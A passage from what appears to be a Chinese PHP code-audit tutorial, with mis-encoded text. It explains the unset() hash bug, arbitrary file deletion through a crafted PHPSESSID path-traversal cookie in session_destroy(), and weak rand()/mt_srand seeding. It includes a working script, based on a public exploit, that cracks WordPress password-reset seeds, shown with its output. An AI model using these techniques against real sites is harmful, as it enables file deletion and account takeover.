class="string">'_data'</span>]);</span><br></pre></td></tr></table></figure><p>åœ¨ä»¥å¾€çš„PHPç‰ˆæœ¬é‡Œï¼Œå¾ˆå¤šå‡½æ•°éƒ½æ›¾ç»å‡ºç°è¿‡æº¢å‡ºæ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å®¡è®¡åº”ç”¨ç¨‹åºæ¼æ´çš„æ—¶å€™ä¸è¦å¿˜è®°äº†æµ‹è¯•ç›®æ ‡ä½¿ç”¨çš„PHPç‰ˆæœ¬ä¿¡æ¯ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šå¯¹åº”fixçš„ç‰ˆæœ¬</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼š</td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾å¯¹åº”å‡½æ•°å</td></tr></tbody></table><h3 id="PHPå‡½æ•°çš„å…¶ä»–æ¼æ´"><a href="#PHPå‡½æ•°çš„å…¶ä»–æ¼æ´" class="headerlink" title="PHPå‡½æ•°çš„å…¶ä»–æ¼æ´"></a>PHPå‡½æ•°çš„å…¶ä»–æ¼æ´</h3><p>Stefan Esserå¤§ç‰›å‘ç°çš„æ¼æ´ï¼šunset()â€“Zend_Hash_Del_Key_Or_Index Vulnerability<br>â€‹<br>æ¯”å¦‚phpwindæ—©æœŸçš„serarch.phpé‡Œçš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>($uids);</span><br><span class="line">......</span><br><span class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</span><br><span class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</span><br><span class="line">$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</span><br><span class="line">........</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šphp4&lt;4.3 php5&lt;5.14</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾unset</td></tr></tbody></table><h3 id="session-destroy-åˆ é™¤æ–‡ä»¶æ¼æ´"><a href="#session-destroy-åˆ é™¤æ–‡ä»¶æ¼æ´" class="headerlink" title="session_destroy()åˆ é™¤æ–‡ä»¶æ¼æ´"></a>session_destroy()åˆ é™¤æ–‡ä»¶æ¼æ´</h3><p><em>æµ‹è¯•PHPç‰ˆæœ¬ï¼š5.1.2</em><br>â€‹<br>è¿™ä¸ªæ¼æ´æ˜¯å‡ å¹´å‰æœ‹å‹saiyå‘ç°çš„ï¼Œsession_destroy()å‡½æ•°çš„åŠŸèƒ½æ˜¯åˆ é™¤sessionæ–‡ä»¶ï¼Œå¾ˆå¤šwebåº”ç”¨ç¨‹åºçš„logoutçš„åŠŸèƒ½éƒ½ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°åˆ é™¤sessionï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°åœ¨ä¸€äº›è€çš„ç‰ˆæœ¬ä¸­ç¼ºå°‘è¿‡æ»¤å¯¼è‡´å¯ä»¥åˆ é™¤ä»»æ„æ–‡ä»¶ã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//val.php   </span></span><br><span class="line">session_save_path(<span class="string">'./'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span>(session_id());</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æäº¤æ„é€ cookie:PHPSESSID=/../1.phpï¼Œç›¸å½“äºunlink(â€˜sess<code>_</code>/../1.phpâ€™)è¿™æ ·å°±é€šè¿‡æ³¨å°„../è½¬è·³ç›®å½•åˆ é™¤ä»»æ„æ–‡ä»¶äº†ã€‚å¾ˆå¤šè‘—åçš„ç¨‹åºæŸäº›ç‰ˆæœ¬éƒ½å—å½±å“å¦‚phpmyadminï¼Œsablogï¼Œphpwind3ç­‰ç­‰ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šå…·ä½“ä¸è¯¦</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾session_destroy</td></tr></tbody></table><h3 id="éšæœºå‡½æ•°"><a href="#éšæœºå‡½æ•°" class="headerlink" title="éšæœºå‡½æ•°"></a>éšæœºå‡½æ•°</h3><p><em>1) rand() VS mt_rand()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//on windows</span></span><br><span class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></span><br><span class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºrand()æœ€å¤§çš„éšæœºæ•°æ˜¯32767ï¼Œè¿™ä¸ªå¾ˆå®¹æ˜“è¢«æˆ‘ä»¬æš´åŠ›ç ´è§£ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= md5(rand());</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">32767</span>;$i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(md5($i) ==$a ) &#123;</span><br><span class="line">   <span class="keyword">print</span> $i.<span class="string">"--&gt;ok!! |</span></span><br><span class="line"><span class="string">| "</span>;<span class="keyword">exit</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123; <span class="keyword">print</span> $i.<span class="string">" |</span></span><br><span class="line"><span class="string">| "</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çš„ç¨‹åºä½¿ç”¨randå¤„ç†sessionæ—¶ï¼Œæ”»å‡»è€…å¾ˆå®¹æ˜“æš´åŠ›ç ´è§£å‡ºä½ çš„sessionï¼Œä½†æ˜¯å¯¹äºmt_randæ˜¯å¾ˆéš¾å•çº¯çš„æš´åŠ›çš„ã€‚</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾rand</td></tr></tbody></table><p><em>2) mt_srand()/srand()-weak seedingï¼ˆby Stefan Esserï¼‰</em></p><p>çœ‹phpæ‰‹å†Œé‡Œçš„æè¿°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mt_srand</span><br><span class="line">(PHP <span class="number">3</span> &gt;= <span class="number">3.0</span><span class="number">.6</span>, PHP <span class="number">4</span>, PHP <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">mt_srand -- æ’­ä¸‹ä¸€ä¸ªæ›´å¥½çš„éšæœºæ•°å‘ç”Ÿå™¨ç§å­</span><br><span class="line">è¯´æ˜</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mt_srand</span> <span class="params">( <span class="keyword">int</span> seed )</span></span></span><br></pre></td></tr></table></figure><p>ç”¨ seed æ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ã€‚ä» PHP 4.2.0 ç‰ˆå¼€å§‹ï¼Œseed å‚æ•°å˜ä¸ºå¯é€‰é¡¹ï¼Œå½“è¯¥é¡¹ä¸ºç©ºæ—¶ï¼Œä¼šè¢«è®¾ä¸ºéšæ—¶æ•°ã€‚ </p><p>ä¾‹å­ 1. mt_srand() èŒƒä¾‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// seed with microseconds</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(make_seed());</span><br><span class="line">$randval = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>_æ³¨: è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() å‡½æ•°ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ï¼Œç°å·²è‡ªåŠ¨å®Œæˆã€‚_</p><p>phpä»4.2.0å¼€å§‹å®ç°äº†è‡ªåŠ¨æ’­ç§ï¼Œä½†æ˜¯ä¸ºäº†å…¼å®¹ï¼Œåæ¥ä½¿ç”¨ç±»ä¼¼äºè¿™æ ·çš„ä»£ç æ’­ç§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand ((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä½¿ç”¨(double)microtime()<code>*</code>1000000ç±»ä¼¼çš„ä»£ç seedæ˜¯æ¯”è¾ƒè„†å¼±çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()&lt;<span class="number">1</span> ---&gt; <span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()* <span class="number">1000000</span>&lt;<span class="number">1000000</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¾ˆå®¹æ˜“æš´åŠ›ç ´è§£,æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"><span class="comment">//&gt;php rand.php</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">////////////////</span></span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</span><br><span class="line">$time=(double) microtime()* <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</span><br><span class="line">mt_srand ($time);</span><br><span class="line"></span><br><span class="line">$search_id = mt_rand();</span><br><span class="line">$seed = search_seed($search_id);</span><br><span class="line"><span class="keyword">print</span> $seed;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</span><br><span class="line">$max = <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$key = mt_rand();</span><br><span class="line"><span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„ä»£ç å®ç°äº†å¯¹seedçš„ç ´è§£ï¼Œå¦å¤–æ ¹æ®Stefan Esserçš„åˆ†æseedè¿˜æ ¹æ®è¿›ç¨‹å˜åŒ–è€Œå˜åŒ–ï¼Œæ¢å¥è¯æ¥è¯´åŒä¸€ä¸ªè¿›ç¨‹é‡Œçš„seedæ˜¯ç›¸åŒçš„ã€‚ ç„¶ååŒä¸€ä¸ªseedæ¯æ¬¡mt_randçš„å€¼éƒ½æ˜¯ç‰¹å®šçš„ã€‚å¦‚ä¸‹å›¾ï¼š</p><table><thead><tr><th style="text-align:left">ä¾‹A</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-A</em></td></tr><tr><td style="text-align:left">mt_rand-A-1</td></tr><tr><td style="text-align:left">mt_rand-A-2</td></tr><tr><td style="text-align:left">mt_rand-A-3</td></tr></tbody></table><table><thead><tr><th style="text-align:left">ä¾‹B</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-B</em></td></tr><tr><td style="text-align:left">mt_rand-B-1</td></tr><tr><td style="text-align:left">mt_rand-B-2</td></tr><tr><td style="text-align:left">mt_rand-B-3</td></tr></tbody></table><p>å¯¹äºseed-Aé‡Œmt_rand-1/2/3éƒ½æ˜¯ä¸ç›¸ç­‰çš„ï¼Œä½†æ˜¯å€¼éƒ½æ˜¯ç‰¹å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“seed-Aç­‰äºseed-Bï¼Œé‚£ä¹ˆmt_rand-A-1å°±ç­‰äºmt_rand-B-1â€¦ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦èƒ½å¤Ÿå¾—åˆ°seedå°±å¯ä»¥å¾—åˆ°æ¯æ¬¡mt_randçš„å€¼äº†ã€‚</p><p>å¯¹äº5.2.6&gt;php&gt;4.2.0ç›´æ¥ä½¿ç”¨é»˜è®¤æ’­ç§çš„ç¨‹åºä¹Ÿæ˜¯ä¸å®‰å…¨çš„ï¼ˆå¾ˆå¤šçš„å®‰å…¨äººå‘˜é”™è¯¯çš„ä»¥ä¸ºè¿™æ ·å°±æ˜¯å®‰å…¨çš„ï¼‰ï¼Œè¿™ä¸ªè¦åˆ†ä¸¤ç§æƒ…å†µæ¥åˆ†æï¼š</p><p>ç¬¬ä¸€ç§ï¼šâ€™Cross Application Attacksâ€™ï¼Œè¿™ä¸ªæ€è·¯åœ¨Stefan Esseræ–‡ç« é‡Œæœ‰æåˆ°ï¼Œä¸»è¦æ˜¯åˆ©ç”¨å…¶ä»–ç¨‹åºå®šä¹‰çš„æ’­ç§ï¼ˆå¦‚mt_srand ((double) microtime()<code>*</code> 1000000)ï¼‰ï¼Œphpbb+wordpreeç»„åˆå°±å­˜åœ¨è¿™æ ·çš„å±é™©.</p><p>ç¬¬äºŒç§ï¼š5.2.6&gt;php&gt;4.2.0é»˜è®¤æ’­ç§çš„ç®—æ³•ä¹Ÿä¸æ˜¯å¾ˆå¼ºæ‚ï¼Œè¿™æ˜¯Stefan Esserçš„æ–‡ç« é‡Œçš„æè¿°ï¼š<br>The Implementation</p><blockquote><p>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p></blockquote><p>åœ¨32ä½ç³»ç»Ÿä¸Šé»˜è®¤çš„æ’­ç§çš„ç§å­ä¸ºæœ€å¤§å€¼æ˜¯<code>2^32</code>ï¼Œè¿™æ ·æˆ‘ä»¬å¾ªç¯æœ€å¤š<code>2^32</code>æ¬¡å°±å¯ä»¥ç ´è§£seedã€‚è€Œåœ¨PHP 4å’ŒPHP 5 &lt;= 5.2.0 çš„ç®—æ³•æœ‰ä¸ªbugï¼šå¥‡æ•°å’Œå¶æ•°çš„æ’­ç§æ˜¯ä¸€æ ·çš„ï¼ˆè¯¦è§é™„å½• [3] ï¼‰,æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">4</span>); </span><br><span class="line">$a = mt_rand(); </span><br><span class="line">mt_srand(<span class="number">5</span>); </span><br><span class="line">$b = mt_rand();</span><br><span class="line"><span class="keyword">print</span> $a.<span class="string">"\n"</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„ä»£ç å‘ç°$a==$bï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ªç¯çš„æ¬¡æ•°ä¸º2^32/2=2^31æ¬¡ã€‚æˆ‘ä»¬çœ‹å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//base on http://www.milw0rm.com/exploits/6421 </span></span><br><span class="line"><span class="comment">//test on php 5.2.0</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'BUGGY'</span>, <span class="number">1</span>); <span class="comment">//ä¸Šé¢ä»£ç $a==$bæ—¶å€™å®šä¹‰BUGGY=1</span></span><br><span class="line"></span><br><span class="line">$key = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">$seed = getseed($key);</span><br><span class="line"><span class="keyword">print</span> $seed.<span class="string">"\n"</span>; </span><br><span class="line"></span><br><span class="line">mt_srand($seed);</span><br><span class="line">$pass = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> $pass.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"><span class="keyword">if</span> ( $special_chars )</span><br><span class="line">$chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">$password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> $password;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getseed</span><span class="params">($resetkey)</span> </span>&#123;</span><br><span class="line">$max = pow(<span class="number">2</span>,(<span class="number">32</span>-BUGGY));</span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;=$max;$x++) &#123;</span><br><span class="line">$seed = BUGGY ? ($x &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> : $x; </span><br><span class="line">mt_srand($seed);</span><br><span class="line">$testkey = wp_generate_password(<span class="number">20</span>,<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">if</span>($testkey==$resetkey) &#123; <span class="keyword">echo</span> <span class="string">"o\n"</span>; <span class="keyword">return</span> $seed; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($x % <span class="number">10000</span>)) <span class="keyword">echo</span> $x / <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">php5&gt;</span><span class="bash">php rand.php</span></span><br><span class="line">M8pzpjwCrvVt3oobAaOr</span><br><span class="line">0123456789101112131415161718192021222324252627282930313233343536373839404142434</span><br><span class="line">445464748495051525354555657585960616263646566676869</span><br><span class="line">7071727374757677787980818283848586878889909192939495969798991001011021031041051</span><br><span class="line">061071081091101111121131141151161171181191201211221</span><br><span class="line">2312412512612712812913013113213313413513613713813914014114214314414514614714814</span><br><span class="line">915015115215315415515615715815916016116216316416516</span><br><span class="line">6167168169170171172173174175176177178179180181182183184185186187188189190191192</span><br><span class="line">193194195196197198199200201202203204205206207208209</span><br><span class="line">2102112122132142152162172182192202212222232242252262272282292302312322332342352</span><br><span class="line">362372382392402412422432442452462472482492502512522</span><br><span class="line">..............01062110622106231062410625106261062710628106291063010631106321063</span><br><span class="line">3o</span><br><span class="line">70693</span><br><span class="line">pjwCrvVt3oobAaOr</span><br></pre></td></tr></table></figure><p>å½“10634æ¬¡æ—¶å€™æˆ‘ä»¬å¾—åˆ°äº†ç»“æœã€‚</p><p>å½“PHPç‰ˆæœ¬åˆ°äº†5.2.1åï¼Œé€šè¿‡ä¿®æ”¹ç®—æ³•ä¿®è¡¥äº†å¥‡æ•°å’Œå¶æ•°çš„æ’­ç§ç›¸ç­‰çš„é—®é¢˜ï¼Œè¿™æ ·ä¹Ÿå¯¼è‡´äº†php5.2.0å‰åå¯¼è‡´åŒä¸€ä¸ªæ’­ç§åçš„mt_rand()çš„å€¼ä¸ä¸€æ ·ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">42</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="comment">//php&lt;=5.20 1387371436</span></span><br><span class="line"><span class="comment">//php&gt;5.20 1354439493 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£æ˜¯è¿™ä¸ªåŸå› ï¼Œä¹Ÿè¦æ±‚äº†æˆ‘ä»¬çš„expçš„è¿è¡Œç¯å¢ƒï¼šå½“ç›®æ ‡&gt;5.20æ—¶å€™ï¼Œæˆ‘ä»¬expè¿è¡Œçš„ç¯å¢ƒä¹Ÿè¦æ˜¯&gt;5.20çš„ç‰ˆæœ¬ï¼Œåè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p><p>ä»ä¸Šé¢çš„æµ‹è¯•åŠåˆ†ææ¥çœ‹ï¼Œphp&lt;5.26ä¸ç®¡æœ‰æ²¡æœ‰å®šä¹‰æ’­ç§ï¼Œmt_randå¤„ç†çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚åœ¨webåº”ç”¨é‡Œå¾ˆå¤šéƒ½ä½¿ç”¨mt_randæ¥å¤„ç†éšæœºçš„sessionï¼Œæ¯”å¦‚å¯†ç æ‰¾å›åŠŸèƒ½ç­‰ç­‰ï¼Œè¿™æ ·çš„åæœå°±æ˜¯è¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ç›´æ¥ä¿®æ”¹å¯†ç ã€‚</p><p>å¾ˆå¤šè‘—åçš„ç¨‹åºéƒ½äº§ç”Ÿäº†ç±»ä¼¼çš„æ¼æ´å¦‚wordpressã€phpbbã€punbbç­‰ç­‰ã€‚ï¼ˆåœ¨åé¢æˆ‘ä»¬å°†å®é™…åˆ†æä¸‹å›½å†…è‘—åçš„bbsç¨‹åºDiscuz!çš„mt_srandå¯¼è‡´çš„æ¼æ´ï¼‰</p><table><thead><tr><th style="text-align:left"><em>æ¼æ´å®¡è®¡ç­–ç•¥</em></th></tr></thead><tbody><tr><td style="text-align:left">PHPç‰ˆæœ¬è¦æ±‚ï¼šphp4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">ç³»ç»Ÿè¦æ±‚ï¼šæ— </td></tr><tr><td style="text-align:left">å®¡è®¡ç­–ç•¥ï¼šæŸ¥æ‰¾mt_srand/mt_rand</td></tr></tbody></table><h3 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h3><hr><p>å…¶å®â€œç‰¹æ®Šå­—ç¬¦â€ä¹Ÿæ²¡æœ‰ç‰¹å®šçš„æ ‡å‡†å®šä¹‰ï¼Œä¸»è¦æ˜¯åœ¨ä¸€äº›code hackingå‘æŒ¥ç€ç‰¹æ®Šé‡ä½œç”¨çš„ä¸€ç±»å­—ç¬¦ã€‚ä¸‹é¢å°±ä¸¾å‡ ä¸ªä¾‹å­ï¼š</p><h3 id="æˆªæ–­"><a href="#æˆªæ–­" class="headerlink" title="æˆªæ–­"></a>æˆªæ–­</h3><p>å…¶ä¸­æœ€æœ‰åçš„æ•°å¤§å®¶éƒ½ç†Ÿæ‚‰çš„nullå­—ç¬¦æˆªæ–­ã€‚</p><h4 id="includeæˆªæ–­"><a href="#includeæˆªæ–­" class="headerlink" title="includeæˆªæ–­"></a>includeæˆªæ–­</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> 